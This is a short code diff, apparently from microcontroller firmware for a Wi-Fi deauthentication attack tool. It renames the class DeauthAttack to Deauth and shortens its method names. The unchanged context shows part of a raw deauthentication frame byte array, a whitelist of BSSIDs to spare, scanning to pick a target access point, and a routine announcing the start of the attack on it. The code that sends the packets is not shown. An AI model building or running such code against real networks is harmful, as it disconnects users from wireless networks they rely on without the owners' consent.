@@ -22,14 +22,16 @@ uint8_t deauthPacket[26] = {
     /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
     };
 
-void DeauthAttack::addToWhitelist(const char* bssid) {
+
+
+void Deauth::add(const char* bssid) {
     Serial.print("('-') Adding ");
     Serial.print(bssid);
     Serial.println(" to the whitelist");
     whitelist.push_back(bssid);
 };
 
-void DeauthAttack::selectAP() {
+void Deauth::select() {
     int apCount = WiFi.scanNetworks();
 
     if (apCount > 0) {
@@ -50,7 +52,7 @@ void DeauthAttack::selectAP() {
     }
 };
 
-void DeauthAttack::startDeauth() {
+void Deauth::deauth() {
     if (randomAP.length() > 0) {
         Serial.println("(>-<) Starting deauthentication attack on the selected AP...");
         // define the attack
@@ -66,7 +68,7 @@ void DeauthAttack::startDeauth() {
     }
 };
 
-void DeauthAttack::start() {
+void Deauth::start() {
     running = true;
     int packetSize = sizeof(deauthPacket);
 
